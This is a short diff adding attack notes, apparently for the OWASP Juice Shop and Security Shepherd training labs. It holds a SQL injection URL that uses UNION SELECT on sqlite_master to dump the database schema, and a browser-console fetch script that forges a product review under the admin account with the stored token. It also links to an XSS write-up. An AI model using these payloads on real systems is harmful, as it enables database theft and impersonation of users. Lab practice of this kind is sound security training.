@@ -1,0 +1,29 @@
+
+//Database Schema(open new tab and paste the url and change the ip addrs and port no)
+http://192.168.20.47:45868/rest/products/search?q=apple%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
+
+
+//Run it in console for Forged Review
+fetch('http://localhost:3000/rest/products/1/reviews', {
+  method: 'PUT',
+  headers: {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + localStorage.getItem('token')
+  },
+  body: JSON.stringify({
+    message: "This product is amazing! (Forged via Console)",
+    author: "admin@juice-sh.op" 
+  })
+})
+.then(response => response.json())
+.then(data => console.log("Success:", data))
+.catch(error => console.error("Error:", error));
+
+
+//Shephered XSS
+https://purpleskypeter.blogspot.com/2018/04/owasp-securityshepherd-xss6.html
+
+
+//juice-shop video link
+https://drive.google.com/file/d/1xQM5sB49tmxcC-C0eEHH_kzWoqeH5pb5/view?usp=sharing
+
